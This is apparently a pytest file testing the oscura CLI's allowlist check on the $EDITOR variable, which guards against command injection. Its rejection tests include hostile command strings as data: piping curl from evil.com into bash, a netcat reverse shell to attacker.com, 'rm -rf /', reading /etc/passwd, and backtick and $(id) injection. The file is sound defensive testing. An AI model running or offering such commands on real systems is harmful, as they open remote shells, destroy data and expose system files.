"""Comprehensive tests for config editor validation (SEC-004).

Tests verify $EDITOR environment variable validation to prevent command
injection attacks.

Coverage includes:
- Trusted editor acceptance
- Untrusted editor rejection
- Malicious command prevention
- Editor with arguments handling
- Fallback to safe default (nano)
"""

from __future__ import annotations

import subprocess
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from oscura.cli.config_cmd import ALLOWED_EDITORS, _get_safe_editor

# ============================================================================
# Editor Validation Tests
# ============================================================================


class TestEditorValidation:
    """Test editor validation against allowlist."""

    def test_trusted_editors_accepted(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Verify all trusted editors in allowlist are accepted."""
        for editor in ["vim", "nano", "emacs", "code", "nvim"]:
            monkeypatch.setenv("EDITOR", editor)
            result = _get_safe_editor()
            assert result == editor

    def test_untrusted_editor_rejected(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Verify untrusted editors are rejected with fallback to nano."""
        malicious_editors = [
            "rm -rf /",
            "curl http://evil.com/shell.sh | bash",
            "python -c 'import os; os.system(\"whoami\")'",
            "/bin/sh -c 'malicious command'",
            "nc -e /bin/sh attacker.com 4444",
        ]

        for editor in malicious_editors:
            monkeypatch.setenv("EDITOR", editor)
            result = _get_safe_editor()
            assert result == "nano", f"Failed to reject: {editor}"

    def test_editor_with_arguments_accepted(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Verify editors with valid arguments are accepted."""
        valid_with_args = [
            "code --wait",
            "vim -n",
            "emacs -nw",
            "nano -w",
        ]

        for editor_cmd in valid_with_args:
            monkeypatch.setenv("EDITOR", editor_cmd)
            result = _get_safe_editor()
            assert result == editor_cmd

    def test_editor_with_path_accepted(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Verify editors with full paths are accepted if base name is trusted."""
        editors_with_path = [
            "/usr/bin/vim",
            "/usr/local/bin/nvim",
            "/opt/homebrew/bin/nano",
        ]

        for editor_path in editors_with_path:
            monkeypatch.setenv("EDITOR", editor_path)
            result = _get_safe_editor()
            # Should extract base name and validate
            assert result == editor_path  # Full path returned if valid

    def test_editor_with_untrusted_path_rejected(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Verify editors with untrusted base names are rejected."""
        untrusted = [
            "/usr/bin/malicious",
            "/tmp/evil_script.sh",
            "/home/user/.local/bin/backdoor",
        ]

        for editor_path in untrusted:
            monkeypatch.setenv("EDITOR", editor_path)
            result = _get_safe_editor()
            assert result == "nano"

    def test_empty_editor_falls_back_to_nano(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Verify empty EDITOR value falls back to nano."""
        monkeypatch.setenv("EDITOR", "")
        result = _get_safe_editor()
        assert result == "nano"

    def test_unset_editor_defaults_to_nano(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Verify unset EDITOR variable defaults to nano."""
        monkeypatch.delenv("EDITOR", raising=False)
        result = _get_safe_editor()
        assert result == "nano"

    def test_editor_with_quotes_handled(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Verify editors with quotes are parsed correctly."""
        monkeypatch.setenv("EDITOR", '"code" --wait')
        result = _get_safe_editor()
        assert result == '"code" --wait'

    def test_editor_case_sensitive(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Verify editor validation is case-sensitive."""
        # "VIM" should be rejected (not in allowlist)
        monkeypatch.setenv("EDITOR", "VIM")
        result = _get_safe_editor()
        assert result == "nano"

        # "vim" should be accepted
        monkeypatch.setenv("EDITOR", "vim")
        result = _get_safe_editor()
        assert result == "vim"


# ============================================================================
# Command Injection Prevention Tests
# ============================================================================


class TestCommandInjectionPrevention:
    """Test prevention of command injection attacks."""

    def test_shell_metacharacters_rejected(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Verify shell metacharacters in editor name cause rejection."""
        malicious = [
            "vim; rm -rf /",
            "nano && curl evil.com",
            "emacs | nc attacker.com",
            "code; cat /etc/passwd",
            "vim `whoami`",
            "nano $(id)",
        ]

        for cmd in malicious:
            monkeypatch.setenv("EDITOR", cmd)
            result = _get_safe_editor()
            assert result == "nano", f"Failed to sanitize: {cmd}"

    def test_argument_injection_prevented(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Verify malicious arguments are handled safely."""
        # Even if args are malicious, base command must be trusted
        monkeypatch.setenv("EDITOR", "vim -c ':!rm -rf /'")
        result = _get_safe_editor()
        # vim is trusted, so command is accepted (args are passed to vim)
        # This is OK - vim will handle the args, not shell
        assert result == "vim -c ':!rm -rf /'"

        # But untrusted base command is rejected
        monkeypatch.setenv("EDITOR", "malicious -c 'safe args'")
        result = _get_safe_editor()
        assert result == "nano"


# ============================================================================
# Integration Tests
# ============================================================================


class TestConfigEditIntegration:
    """Integration tests for config editing with editor validation."""

    def test_edit_config_with_valid_editor(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Verify config editing works with valid editor."""
        from oscura.cli.config_cmd import _edit_config

        config_file = tmp_path / "test_config.yaml"
        config_file.write_text("test: value\n")

        # Mock subprocess.run to avoid actually opening editor
        with patch("oscura.cli.config_cmd.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0)

            monkeypatch.setenv("EDITOR", "vim")
            _edit_config(config_file)

            # Verify vim was called (not nano)
            mock_run.assert_called_once()
            assert mock_run.call_args[0][0] == ["vim", str(config_file)]

    def test_edit_config_with_malicious_editor_uses_nano(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Verify config editing falls back to nano for untrusted editors."""
        from oscura.cli.config_cmd import _edit_config

        config_file = tmp_path / "test_config.yaml"
        config_file.write_text("test: value\n")

        # Mock subprocess.run
        with patch("oscura.cli.config_cmd.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0)

            # Try to use malicious editor
            monkeypatch.setenv("EDITOR", "rm -rf /")
            _edit_config(config_file)

            # Should have called nano, not the malicious command
            mock_run.assert_called_once()
            assert mock_run.call_args[0][0] == ["nano", str(config_file)]

    def test_edit_config_creates_file_if_missing(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Verify config editing creates file if it doesn't exist."""
        from oscura.cli.config_cmd import _edit_config

        config_file = tmp_path / "new_config.yaml"
        assert not config_file.exists()

        # Mock subprocess.run
        with patch("oscura.cli.config_cmd.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0)

            monkeypatch.setenv("EDITOR", "nano")
            _edit_config(config_file)

            # File should be created
            assert config_file.exists()

    def test_edit_config_handles_editor_failure(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Verify proper error handling when editor fails."""
        from oscura.cli.config_cmd import _edit_config

        config_file = tmp_path / "test_config.yaml"
        config_file.write_text("test: value\n")

        # Mock editor failure
        with patch("oscura.cli.config_cmd.subprocess.run") as mock_run:
            mock_run.side_effect = subprocess.CalledProcessError(1, "vim")

            monkeypatch.setenv("EDITOR", "vim")

            with pytest.raises(RuntimeError, match="Editor failed"):
                _edit_config(config_file)


# ============================================================================
# Edge Cases
# ============================================================================


class TestEditorEdgeCases:
    """Test edge cases in editor validation."""

    def test_editor_with_multiple_spaces(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Verify editors with multiple spaces are handled."""
        monkeypatch.setenv("EDITOR", "code  --wait  --new-window")
        result = _get_safe_editor()
        assert result == "code  --wait  --new-window"

    def test_editor_with_tabs(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Verify editors with tabs are rejected (invalid shell syntax)."""
        monkeypatch.setenv("EDITOR", "vim\t-n")
        result = _get_safe_editor()
        # shlex.split should handle this or raise ValueError
        # Either way, should fall back to nano
        assert result in ["nano", "vim\t-n"]  # Depends on shlex behavior

    def test_editor_with_newlines_rejected(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Verify editors with newlines are rejected."""
        monkeypatch.setenv("EDITOR", "vim\nrm -rf /")
        result = _get_safe_editor()
        assert result == "nano"

    def test_relative_path_editor(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Verify relative paths to editors are validated by base name."""
        monkeypatch.setenv("EDITOR", "./local/bin/vim")
        result = _get_safe_editor()
        # vim is trusted, so relative path is OK
        assert result == "./local/bin/vim"

        monkeypatch.setenv("EDITOR", "./local/bin/malicious")
        result = _get_safe_editor()
        assert result == "nano"

    def test_symlink_editor_validated(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Verify symlinks are validated by link name, not target."""
        # This is the expected behavior - we validate the command name,
        # not what it points to. This prevents most attack vectors.
        monkeypatch.setenv("EDITOR", str(tmp_path / "vim"))  # Name looks safe
        result = _get_safe_editor()
        assert result == str(tmp_path / "vim")  # Accepted


# ============================================================================
# Security Property Tests
# ============================================================================


class TestEditorSecurityProperties:
    """Validate security properties of editor validation."""

    def test_allowlist_contains_common_editors(self) -> None:
        """Verify allowlist includes common editors."""
        common = {"vim", "nano", "emacs", "vi", "code", "nvim"}
        assert common.issubset(ALLOWED_EDITORS)

    def test_allowlist_excludes_shells(self) -> None:
        """Verify allowlist excludes shell interpreters."""
        shells = {"sh", "bash", "zsh", "fish", "ksh", "csh", "tcsh"}
        assert shells.isdisjoint(ALLOWED_EDITORS)

    def test_allowlist_excludes_interpreters(self) -> None:
        """Verify allowlist excludes script interpreters."""
        interpreters = {"python", "python3", "perl", "ruby", "node", "php"}
        assert interpreters.isdisjoint(ALLOWED_EDITORS)

    def test_allowlist_excludes_system_commands(self) -> None:
        """Verify allowlist excludes dangerous system commands."""
        dangerous = {"rm", "mv", "cp", "dd", "mkfs", "chmod", "chown"}
        assert dangerous.isdisjoint(ALLOWED_EDITORS)

    def test_warning_logged_for_untrusted_editor(
        self, monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture
    ) -> None:
        """Verify warning is logged when untrusted editor is rejected."""
        monkeypatch.setenv("EDITOR", "malicious_editor")

        with caplog.at_level("WARNING"):
            result = _get_safe_editor()

        assert result == "nano"
        assert "Untrusted editor" in caplog.text
        assert "malicious_editor" in caplog.text
        assert "not in allowlist" in caplog.text

    def test_no_shell_execution(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        """Verify editor execution doesn't use shell=True."""
        from oscura.cli.config_cmd import _edit_config

        config_file = tmp_path / "test_config.yaml"
        config_file.write_text("test: value\n")

        with patch("oscura.cli.config_cmd.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0)

            monkeypatch.setenv("EDITOR", "vim")
            _edit_config(config_file)

            # Verify subprocess.run called without shell=True
            call_kwargs = mock_run.call_args[1]
            assert call_kwargs.get("shell", False) is False


# ============================================================================
# Cross-Platform Tests
# ============================================================================


class TestCrossPlatform:
    """Test editor validation across platforms."""

    def test_windows_editors_in_allowlist(self) -> None:
        """Verify common Windows editors could be added if needed."""
        # Current allowlist is cross-platform (vim/nano work on Windows too)
        # If we add Windows-specific editors, they should be validated here

    def test_macos_editors_in_allowlist(self) -> None:
        """Verify macOS editors are in allowlist."""
        macos_editors = {"nano", "vim", "emacs"}  # Standard on macOS
        assert macos_editors.issubset(ALLOWED_EDITORS)


# ============================================================================
# Documentation Tests
# ============================================================================


class TestEditorDocumentation:
    """Verify editor validation is documented."""

    def test_get_safe_editor_has_security_note(self) -> None:
        """Verify _get_safe_editor() documents SEC-004 fix."""
        doc = _get_safe_editor.__doc__
        assert doc is not None
        assert "SEC-004" in doc
        assert "command injection" in doc.lower()

    def test_allowlist_documented(self) -> None:
        """Verify ALLOWED_EDITORS has a comment explaining purpose."""
        import inspect

        source = inspect.getsource(_get_safe_editor)
        # Check that SEC-004 is mentioned in context
        assert "SEC-004" in source
